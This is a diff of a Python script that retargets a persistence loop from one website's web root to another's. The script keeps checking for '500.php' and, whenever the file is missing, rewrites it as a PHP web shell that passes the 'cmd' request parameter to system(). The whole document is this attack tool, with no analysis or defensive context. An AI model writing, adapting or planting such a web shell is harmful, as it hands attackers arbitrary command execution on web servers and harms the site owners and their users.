@@ -4,7 +4,7 @@ import os.path
 
 def main():
     while True:
-        f = os.path.exists('/home/admin/web/dinneride.com/public_html/500.php')
+        f = os.path.exists('/home/admin/web/druxye.biz/public_html/500.php')
         
         if f == True:
             print("[*] file exists")
@@ -15,7 +15,7 @@ def main():
             print("[!] file not found")
             print("[!] creating file")
             
-            a = open('/home/admin/web/dinneride.com/public_html/500.php','a')
+            a = open('/home/admin/web/druxye.biz/public_html/500.php','a')
             a.write('<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>')
             a.close()
             time.sleep(5)
